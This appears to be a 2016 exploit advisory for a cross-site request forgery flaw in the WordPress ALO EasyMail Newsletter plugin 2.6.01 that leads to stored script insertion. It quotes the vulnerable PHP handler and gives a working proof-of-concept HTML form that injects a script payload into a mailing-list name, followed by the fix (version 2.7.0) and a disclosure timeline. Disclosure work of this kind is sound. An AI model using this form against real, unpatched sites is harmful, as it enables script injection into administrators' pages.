@@ -1,0 +1,85 @@
+# Exploit Title: Wordpress ALO EasyMail Newsletter plugin cross-site request forgery vulnerability
+# Software Link: https://wordpress.org/plugins/alo-easymail/
+# Affected Version: 2.6.01
+# Exploit Author: Mohsen Lotfi
+# Contact: mohsen.lotfi.all@gmail.com
+# Twitter: fox_one_fox_one
+# Date: 01-16-2016
+
+#####################
+1. Description
+#####################
+
+The plugin contains a CSRF vulnerability, which can be exploited to perform a script insertion attack.
+
+script insertion happens in wp-content/plugins/alo-easymail/pages/alo-easymail-admin-options.php : 
+
+                case "save_list":	// SAVE a mailing list (add or update)
+			if ( isset($_REQUEST['submit_list']) ) {
+				//$list_name = stripslashes( trim( $_POST['elp_list_name'] ) );
+				
+				// List name	
+				$list_name	= array();
+				foreach ( $languages as $key => $lang ) {
+					if (isset($_POST['listname_'.$lang]) )	$list_name[$lang] = stripslashes(trim($_POST['listname_'.$lang]));        /* script insertion here */
+				}
+				
+				$list_available = stripslashes( trim( $_POST['elp_list_available'] ) );
+				$list_order = stripslashes( trim( $_POST['elp_list_order'] ) );
+				if ( $list_name && $list_available && is_numeric($list_order) ) {
+					$mailinglists = alo_em_get_mailinglists ( 'hidden,admin,public' );
+					if ( $list_id )  { // update
+						$mailinglists [$list_id] = array ( "name" => $list_name, "available" => $list_available, "order" => $list_order );
+					} else { // or add a new
+						if ( empty($mailinglists) ) { // if 1st list, skip index 0
+							$mailinglists [] = array ( "name" => "not-used", "available" => "deleted", "order" => "");
+						}	
+						$mailinglists [] = array ( "name" => $list_name, "available" => $list_available, "order" => $list_order);
+					}
+					if ( alo_em_save_mailinglists ( $mailinglists ) ) {
+						unset ( $list_id );
+						unset ( $list_name );
+						unset ( $list_available );						
+						unset ( $list_order );	
+						echo '<div id="message" class="updated fade"><p>'. __("Updated", "alo-easymail") .'</p></div>';
+					} else {
+						echo '<div id="message" class="error"><p>'. __("Error during operation.", "alo-easymail") .'</p></div>';
+					}
+				} else {
+					echo '<div id="message" class="error"><p>'. __("Inputs are incompled or wrong. Please check and try again.", "alo-easymail") .'</p></div>';
+				}
+			}	
+			break;
+
+
+#####################
+2. Proof of Concept
+#####################
+ 
+Login as regular user then:
+ 
+<form method="post" action="http://localhost/wordpress4.4/wp-admin/edit.php?post_type=newsletter&page=alo-easymail/pages/alo-easymail-admin-options.php">
+    <input type="hidden" name="listname_en" value="<script>alert('xss')</script>">
+    <input type="hidden" name="elp_list_available" value="hidden">
+    <input type="hidden" name="elp_list_order" value="0">
+    <input type="hidden" name="user_ID" value="1">
+    <input type="hidden" name="task" value="save_list">
+    <input type="hidden" name="list_id" value="">
+    <input type="submit" name="submit_list" value="Trigger!">
+</form>
+
+
+#####################
+3. Sulotion
+#####################
+   
+Update to version 2.7.0
+https://wordpress.org/plugins/alo-easymail/changelog/
+
+#####################
+4. Report Timeline
+#####################
+
+01-16-2016 : Vulnerability discovered.
+01-25-2016 : Vendor notified of vulnerability.
+02-07-2016 : Vendor replied and released fixed version.
